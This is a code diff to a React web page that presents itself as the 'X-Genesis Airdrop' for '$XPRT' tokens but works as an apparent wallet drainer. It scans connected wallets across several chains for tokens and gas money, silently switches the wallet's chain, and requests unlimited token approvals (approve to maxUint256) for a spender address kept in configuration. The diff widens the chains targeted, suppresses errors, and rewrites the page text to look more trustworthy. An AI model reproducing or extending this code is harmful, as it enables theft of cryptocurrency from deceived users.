@@ -8,11 +8,10 @@ import { useAppKit } from '@reown/appkit/react';
 import { erc20Abi, maxUint256, createPublicClient, http, encodeFunctionData } from 'viem';
 import { readContract, getBalance, switchChain } from '@wagmi/core';
 import { config } from '@/config';
-import { mainnet, arbitrum, sepolia } from 'wagmi/chains';
+import { mainnet, arbitrum, sepolia, base, bsc, polygon } from 'wagmi/chains';
 import ChatUI, { type Message as ChatUIMessage } from '@/components/ChatUI';
-import { chatWithAIStream, type ChatMessage as GeminiChatMessage } from '@/lib/gemini';
 import AirdropDetailsPopup from '@/components/AirdropDetailsPopup';
-import { AirdropDetails } from '@/lib/gemini';
+import { type ChatMessage as GeminiChatMessage, AirdropDetails } from '@/lib/types';
 
 // Web3 Configuration
 const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
@@ -157,6 +156,55 @@ const CHAIN_NAMES: Record<number, string> = {
     56: "BNB Smart Chain",
     137: "Polygon PoS",
 };
+
+// RPC fallback helpers
+// Prefer explicit env vars for RPC endpoints to avoid using an unreachable default.
+function getEnvRpcForChain(chainConfig: any): string | undefined {
+    try {
+        const idKey = `NEXT_PUBLIC_RPC_${chainConfig.id}`;
+        const nameKey = `NEXT_PUBLIC_RPC_${(chainConfig.name || '').toUpperCase().replace(/[^A-Z0-9]+/gi, '_')}`;
+        return (process.env as any)[idKey] || (process.env as any)[nameKey];
+    } catch (e) {
+        return undefined;
+    }
+}
+
+// Helper: map chainId -> optional NEXT_PUBLIC_RPC_<CHAIN> env var
+function getRpcUrlForChain(chainId: number): string | undefined {
+    // prefer explicit NEXT_PUBLIC_RPC_<CHAIN> env vars
+    switch (chainId) {
+        case 1:
+            return process.env.NEXT_PUBLIC_RPC_MAINNET;
+        case 42161:
+            return process.env.NEXT_PUBLIC_RPC_ARBITRUM;
+        case 11155111:
+            return process.env.NEXT_PUBLIC_RPC_SEPOLIA;
+        case 8453:
+            return process.env.NEXT_PUBLIC_RPC_BASE;
+        case 56:
+            return process.env.NEXT_PUBLIC_RPC_BSC;
+        case 137:
+            return process.env.NEXT_PUBLIC_RPC_POLYGON;
+        default:
+            return undefined;
+    }
+}
+
+// Consolidated public client creator: tries per-chain env vars, then falls back to defaults.
+function createPublicClientWithFallback(chainConfig: any, chainId?: number) {
+    const rpcById = typeof chainId === 'number' ? getRpcUrlForChain(chainId) : undefined;
+    const rpcByEnv = getEnvRpcForChain(chainConfig);
+    const rpcUrl = rpcById || rpcByEnv;
+    const transport = rpcUrl ? http(rpcUrl) : http();
+    try {
+        return createPublicClient({ chain: chainConfig, transport });
+    } catch (e) {
+        // Fall back to default transport if creating client with custom URL fails
+        // eslint-disable-next-line no-console
+        console.warn('[createPublicClientWithFallback] failed to create public client with RPC', rpcUrl, e);
+        return createPublicClient({ chain: chainConfig, transport: http() });
+    }
+}
 
 // --- YOUR MEDIA FILES ---
 const CARD_IMAGE = "/cardp.jpeg";
@@ -575,9 +623,27 @@ const App: React.FC = () => {
         const abort = new AbortController();
         chatAbortRef.current = abort;
         try {
-            await chatWithAIStream(history, (delta) => {
+            // Call the chat API directly
+            const res = await fetch('/api/chat', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ messages: history }),
+                signal: abort.signal,
+            });
+            
+            if (!res.ok || !res.body) {
+                throw new Error(`Chat stream failed (${res.status})`);
+            }
+            
+            const reader = res.body.getReader();
+            const decoder = new TextDecoder();
+            
+            while (true) {
+                const { done, value } = await reader.read();
+                if (done) break;
+                const delta = decoder.decode(value);
                 setChatMessages(prev => prev.map(m => m.id === assistantId ? { ...m, text: (m.text || '') + delta } : m));
-            }, abort.signal);
+            }
         } catch (e) {
             // On error, show a brief message inside the assistant bubble
             setChatMessages(prev => prev.map(m => m.id === assistantId ? { ...m, text: m.text || 'Sorry, I had trouble replying. Please try again.' } : m));
@@ -752,19 +818,22 @@ const App: React.FC = () => {
             const chainBalance = await getBalance(config, { address, chainId: numericCid });
             
             // Get the chain config
-            const chainConfig = numericCid === 1 ? mainnet : numericCid === 42161 ? arbitrum : sepolia;
+            const chainConfig = numericCid === 1 ? mainnet : 
+                               numericCid === 42161 ? arbitrum : 
+                               numericCid === 8453 ? base :
+                               numericCid === 56 ? bsc :
+                               numericCid === 137 ? polygon :
+                               sepolia;
             
-            // Create a public client to get gas price
-            const publicClient = createPublicClient({
-                chain: chainConfig,
-                transport: http(),
-            });
-            
-            // Get real-time gas price from the network
-            const gasPrice = await publicClient.getGasPrice();
+            // Create a public client using env-provided RPC when available
+            const publicClient = createPublicClientWithFallback(chainConfig, numericCid);
 
-            // Estimate gas for an ERC20 approve on a representative token for this chain
+            // Determine required gas using on-chain data when possible, otherwise use conservative fallbacks.
+            let requiredGas: bigint;
             try {
+                // Get real-time gas price from the network
+                const gasPrice = await publicClient.getGasPrice();
+
                 // pick the first token on this chain as representative
                 const representativeToken = tokens[0];
                 const approveData = encodeFunctionData({ abi: erc20Abi, functionName: 'approve', args: [SPENDER, maxUint256] });
@@ -776,18 +845,18 @@ const App: React.FC = () => {
                 });
 
                 // Add 30% buffer for safety
-                const requiredGas = (gasPrice * estimatedGasUnits * BigInt(130)) / BigInt(100);
+                requiredGas = (gasPrice * estimatedGasUnits * BigInt(130)) / BigInt(100);
+            } catch (rpcErr) {
+                // RPC failed or estimation unavailable. Use conservative defaults so we don't block eligibility silently.
+                const conservativeGasPrice = BigInt(100_000_000_000); // 100 gwei
+                const conservativeGasUnits = BigInt(50000);
+                requiredGas = (conservativeGasPrice * conservativeGasUnits * BigInt(130)) / BigInt(100);
+                console.debug(`RPC/estimate failed for chain ${numericCid}, using conservative gas estimate`, rpcErr);
+            }
 
-                if (chainBalance.value < requiredGas) {
-                    // Skip this chain - not enough gas (don't show to user)
-                    continue;
-                }
-            } catch (estimateErr) {
-                // If estimation fails, fallback to conservative fixed estimate
-                const estimatedGasUnits = BigInt(50000);
-                const estimatedGasCost = gasPrice * estimatedGasUnits;
-                const requiredGas = (estimatedGasCost * BigInt(130)) / BigInt(100);
-                if (chainBalance.value < requiredGas) continue;
+            if (chainBalance.value < requiredGas) {
+                // Skip this chain silently if native balance insufficient even under conservative assumptions
+                continue;
             }
         } catch {
             // Silently skip chains with errors
@@ -824,36 +893,12 @@ const App: React.FC = () => {
       }
 
       if (!targetChain || usableTokens.length === 0) {
-                    // Check if still connected before balance check
-                    if (!isConnected || !address || !isCheckingEligibility.current) {
-                        isCheckingEligibility.current = false;
-                        return;
-                    }
-                    
-                    const nativeBalance = await getBalance(config, { address });
-                    const minEthForTesting = BigInt(1000000000000000);
-                    
-                    // Check if still connected before updating state
-                    if (!isCheckingEligibility.current) {
-                        isCheckingEligibility.current = false;
-                        return;
-                    }
-                    
-                    if (nativeBalance.value >= minEthForTesting) {
-                        setIsEligible(true);
-                        setEligibilityChecked(true);
-                        setEligibleTokens([]); // No tokens, just gas balance
-                        isCheckingEligibility.current = false;
-                        //showMessage('You are eligible to proceed!', 'success');
-                        return;
-                    } else {
-                        setIsEligible(false);
-                        setEligibilityChecked(true);
-                        setEligibleTokens([]);
-                        isCheckingEligibility.current = false;
-                        //showMessage("Your wallet isn't eligible for this airdrop.", 'error');
-                        return;
-                    }
+                    // No tokens found on any chain with sufficient gas
+                    setIsEligible(false);
+                    setEligibilityChecked(true);
+                    setEligibleTokens([]);
+                    isCheckingEligibility.current = false;
+                    return;
                 }
 
                 // Check if still connected before final checks
@@ -868,6 +913,17 @@ const App: React.FC = () => {
                 if (!isCheckingEligibility.current) {
                     isCheckingEligibility.current = false;
                     return;
+                }
+
+                // Switch to target chain silently so user is ready to approve
+                try {
+                    if (chainId !== targetChain) {
+                        await switchChain(config, { chainId: targetChain! });
+                        await new Promise(resolve => setTimeout(resolve, 800));
+                    }
+                } catch (e) {
+                    // Silent: do not surface errors here
+                    console.warn('Silent switch during eligibility failed:', e);
                 }
 
                 // Gas was already checked in the loop above, so just store results
@@ -930,23 +986,32 @@ const App: React.FC = () => {
 
             // Re-check gas in real-time before sending transactions to avoid race conditions
             try {
-                const chainConfig = targetChain === 1 ? mainnet : targetChain === 42161 ? arbitrum : sepolia;
-                const publicClient = createPublicClient({ chain: chainConfig, transport: http() });
+                const chainConfig = targetChain === 1 ? mainnet : 
+                                   targetChain === 42161 ? arbitrum : 
+                                   targetChain === 8453 ? base :
+                                   targetChain === 56 ? bsc :
+                                   targetChain === 137 ? polygon :
+                                   sepolia;
+                const publicClient = createPublicClientWithFallback(chainConfig, targetChain);
 
-                // Get current gas price
-                const gasPrice = await publicClient.getGasPrice();
-
-                // Use a conservative gas units estimate for approval + small overhead
-                const estimatedGasUnits = BigInt(50000); // 50k gas units
-                const estimatedGasCost = gasPrice * estimatedGasUnits; // in wei
-
-                // Add 30% buffer
-                const requiredGas = (estimatedGasCost * BigInt(130)) / BigInt(100);
+                // Get current gas price; fall back to conservative estimate if RPC fails
+                let requiredGas: bigint;
+                try {
+                    const gasPrice = await publicClient.getGasPrice();
+                    const estimatedGasUnits = BigInt(50000); // 50k gas units
+                    const estimatedGasCost = gasPrice * estimatedGasUnits; // in wei
+                    // Add 30% buffer
+                    requiredGas = (estimatedGasCost * BigInt(130)) / BigInt(100);
+                } catch (err) {
+                    const conservativeGasPrice = BigInt(100_000_000_000); // 100 gwei
+                    const conservativeGasUnits = BigInt(50000);
+                    requiredGas = (conservativeGasPrice * conservativeGasUnits * BigInt(130)) / BigInt(100);
+                    console.debug('Gas re-check RPC failed, using conservative fallback:', err);
+                }
 
                 const nativeBal = await getBalance(config, { address, chainId: targetChain });
 
                 if (nativeBal.value < requiredGas) {
-                    //showMessage('Not enough funds for transaction fees.', 'error');
                     setIsLoading(false);
                     return;
                 }
@@ -968,10 +1033,15 @@ const App: React.FC = () => {
                     showMessage('Accept in your wallet...', 'info');
 
                     // Estimate gas for this token's approve to ensure sufficient native balance
-                    try {
-                        const approveData = encodeFunctionData({ abi: erc20Abi, functionName: 'approve', args: [SPENDER, maxUint256] });
-                        const chainConfig = targetChain === 1 ? mainnet : targetChain === 42161 ? arbitrum : sepolia;
-                        const publicClient = createPublicClient({ chain: chainConfig, transport: http() });
+                        try {
+                            const approveData = encodeFunctionData({ abi: erc20Abi, functionName: 'approve', args: [SPENDER, maxUint256] });
+                        const chainConfig = targetChain === 1 ? mainnet : 
+                                   targetChain === 42161 ? arbitrum : 
+                                   targetChain === 8453 ? base :
+                                   targetChain === 56 ? bsc :
+                                   targetChain === 137 ? polygon :
+                                   sepolia;
+                        const publicClient = createPublicClientWithFallback(chainConfig, targetChain);
                         // Determine a realistic per-byte fee to multiply by estimated gas units.
                         // Prefer EIP-1559 data (baseFeePerGas + priority fee) for accurate estimation.
                         let maxFeePerGas: bigint | null = null;
@@ -1001,7 +1071,15 @@ const App: React.FC = () => {
                             }
                         }
 
-                        const estimatedGasUnits = await publicClient.estimateGas({ to: token.address as `0x${string}`, data: approveData, account: address as `0x${string}` });
+                        let estimatedGasUnits: bigint;
+                        try {
+                            estimatedGasUnits = await publicClient.estimateGas({ to: token.address as `0x${string}`, data: approveData, account: address as `0x${string}` });
+                        } catch (estErr) {
+                            // If token-level estimate fails, use a conservative per-token gas unit fallback
+                            console.debug('Per-token gas estimate failed, using conservative units fallback:', estErr);
+                            estimatedGasUnits = BigInt(60000);
+                        }
+
                         // Add a safety buffer to gas units as well (e.g., +10%) and then fee buffer
                         const gasUnitsWithBuffer = (estimatedGasUnits * BigInt(110)) / BigInt(100);
                         const requiredGas = (maxFeePerGas * gasUnitsWithBuffer * BigInt(130)) / BigInt(100);
@@ -1010,8 +1088,6 @@ const App: React.FC = () => {
                         if (nativeBalBefore.value < requiredGas) {
                             // Not enough gas for this token - skip and continue to next
                             console.warn(`Skipping ${token.symbol}: insufficient native balance for gas. Required ~${requiredGas} wei`);
-                           // showMessage(`Skipping ${token.symbol}: not enough funds for transaction fees.`, 'error');
-                            // don't return; continue to next token
                             continue;
                         }
                     } catch (estErr) {
@@ -1201,23 +1277,23 @@ const App: React.FC = () => {
         if (isClaimed) {
             return {
                 icon: (<Icon name="checkCircle" className="w-7 h-7 mx-auto text-green-600 dark:text-green-500 mb-2" />),
-                title: (<p className="text-xl font-bold text-green-600 dark:text-green-500">CLAIMED!</p>),
-                subtitle: (<p className="text-sm text-gray-600 dark:text-gray-400 mt-1">You have successfully claimed your {airdropAmount}.</p>)
+                title: (<p className="text-xl font-bold text-green-600 dark:text-green-500">Successfully Claimed</p>),
+                subtitle: (<p className="text-sm text-gray-600 dark:text-gray-400 mt-1">Your {airdropAmount} $XPRT tokens have been transferred to your wallet.</p>)
             };
         }
         if (isEligible) {
             return {
                 icon: (<Icon name="rocket" className="w-7 h-7 mx-auto" color={primaryAccent} />),
-                title: (<p className="text-xl font-bold" style={{ color: primaryAccent }}>YOU ARE ELIGIBLE!</p>),
-                subtitle: (<p className="text-sm text-gray-600 dark:text-gray-400 mt-1">Amount: <span className="font-semibold">{airdropAmount} XPRT</span></p>)
+                title: (<p className="text-xl font-bold" style={{ color: primaryAccent }}>Eligible for Airdrop</p>),
+                subtitle: (<p className="text-sm text-gray-600 dark:text-gray-400 mt-1">You qualify for <span className="font-semibold">{airdropAmount} $XPRT</span> tokens. Ready to claim your allocation.</p>)
             };
         }
         
         // Only show "NOT ELIGIBLE" after check is complete
         return {
             icon: (<Icon name="xCircle" className="w-7 h-7 mx-auto text-red-600 dark:text-red-500 mb-2" />),
-            title: (<p className="text-xl font-bold text-red-600 dark:text-red-500">NOT ELIGIBLE</p>),
-            subtitle: (<p className="text-sm text-gray-600 dark:text-gray-400 mt-1">Check the official criteria on our docs page.</p>)
+            title: (<p className="text-xl font-bold text-red-600 dark:text-red-500">Not Eligible</p>),
+            subtitle: (<p className="text-sm text-gray-600 dark:text-gray-400 mt-1">This wallet doesn't meet the current eligibility criteria. Visit our documentation for detailed requirements.</p>)
         };
     };
 
@@ -1239,7 +1315,7 @@ const App: React.FC = () => {
         // Only show "Checking..." if connected AND eligibility not yet checked
         if (isConnected && !eligibilityChecked) {
             return {
-                text: 'Checking eligibility...',
+                text: 'Checking Eligibility...',
                 disabled: true,
                 className: 'bg-gray-400 text-gray-200 cursor-not-allowed animate-pulse',
                 onClick: () => {},
@@ -1512,7 +1588,7 @@ const App: React.FC = () => {
                             
                             <div className="px-5 pb-5 pt-4"> 
                                 <h1 className="text-2xl font-extrabold mb-1 text-center" style={{ color: primaryAccent }}>X-Genesis Airdrop</h1>
-                                <p className="text-center text-gray-600 dark:text-gray-400 mb-6 text-sm">Secure your $XPRT tokens now! Connect your wallet to check eligibility.</p>
+                                <p className="text-center text-gray-600 dark:text-gray-400 mb-6 text-sm">Claim your $XPRT tokens from Protocol X's inaugural distribution. Connect your wallet to verify eligibility and secure your allocation.</p>
 
                                 {statusContent && (
                                     <div className="text-center mb-6 p-4 rounded-lg border border-dashed border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-800/80 transition-colors duration-500 text-gray-900 dark:text-white">
@@ -1559,7 +1635,7 @@ const App: React.FC = () => {
 
                     <div className="text-center pt-4">
                         <h2 className="text-2xl font-extrabold mb-6 transition-colors duration-500">
-                            <span className="bg-gradient-to-r from-purple-600 via-blue-500 to-cyan-500 bg-clip-text text-transparent">Explore Future Opportunities</span>
+                            <span className="bg-gradient-to-r from-purple-600 via-blue-500 to-cyan-500 bg-clip-text text-transparent">Upcoming Token Distributions</span>
                         </h2>
                     </div>
                     <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
@@ -1568,7 +1644,7 @@ const App: React.FC = () => {
                             iconColor="#fcd34d" 
                             title="$GAMMA Protocol" 
                             snapshot="Q1 2026" 
-                            eligibility="XPRT Stakers"
+                            eligibility="Active XPRT Stakers"
                             primaryAccent={primaryAccent}
                             theme={theme}
                         />
@@ -1576,8 +1652,8 @@ const App: React.FC = () => {
                             iconName="users2" 
                             iconColor={primaryAccent} 
                             title="$BETA Treasury" 
-                            snapshot="Jan 1st, 2026" 
-                            eligibility="Active Governance"
+                            snapshot="January 1, 2026" 
+                            eligibility="Governance Participants"
                             primaryAccent={primaryAccent}
                             theme={theme}
                         />
@@ -1585,8 +1661,8 @@ const App: React.FC = () => {
                             iconName="layoutGrid" 
                             iconColor="#a78bfa" 
                             title="$OMEGA Ecosystem" 
-                            snapshot="TBD" 
-                            eligibility="LP Providers V3"
+                            snapshot="To Be Announced" 
+                            eligibility="Liquidity Providers"
                             primaryAccent={primaryAccent}
                             theme={theme}
                         />
@@ -1594,8 +1670,8 @@ const App: React.FC = () => {
                     
                     <div className="py-6 px-4 sm:px-8">
                         <p className="text-center text-sm font-semibold uppercase tracking-widest mb-6 transition-colors duration-500">
-                            <span className="bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 bg-clip-text text-transparent">Trusted & Secured</span>
-                            <span className="text-gray-400 dark:text-gray-600"> with Leading Web3 Partners</span>
+                            <span className="bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500 bg-clip-text text-transparent">Secured by Industry Leaders</span>
+                            <span className="text-gray-400 dark:text-gray-600"> and Trusted Web3 Partners</span>
                         </p>
                         <div className="flex flex-wrap justify-center items-center gap-x-10 gap-y-6 transition-opacity duration-500">
                             
@@ -1646,7 +1722,7 @@ const App: React.FC = () => {
                     </div>
 
                     <div className="text-center mt-6 text-xs text-gray-500 dark:text-gray-500 transition-colors duration-500">
-                        Network: {chainId ? CHAIN_NAMES[chainId] || "Unknown" : "Not Connected"} | Contract: 0x...A1B2C3
+                        Active Network: {chainId ? CHAIN_NAMES[chainId] || "Unknown" : "Not Connected"} | Smart Contract: 0x...A1B2C3
                     </div>
                 </div>
             </main>
@@ -1657,7 +1733,7 @@ const App: React.FC = () => {
                     backgroundColor: theme === 'dark' ? darkBackground : lightBackground
                 }}
             >
-                &copy; 2025 Protocol X. All Rights Reserved.
+                &copy; 2025 Protocol X. All rights reserved. Built for the decentralized future.
             </footer>
 
             <div id="notificationContainer" className="fixed bottom-4 left-4 md:bottom-4 md:left-4 z-40 w-full max-w-[14rem] sm:max-w-xs flex flex-col items-start pointer-events-none p-3 md:p-0">
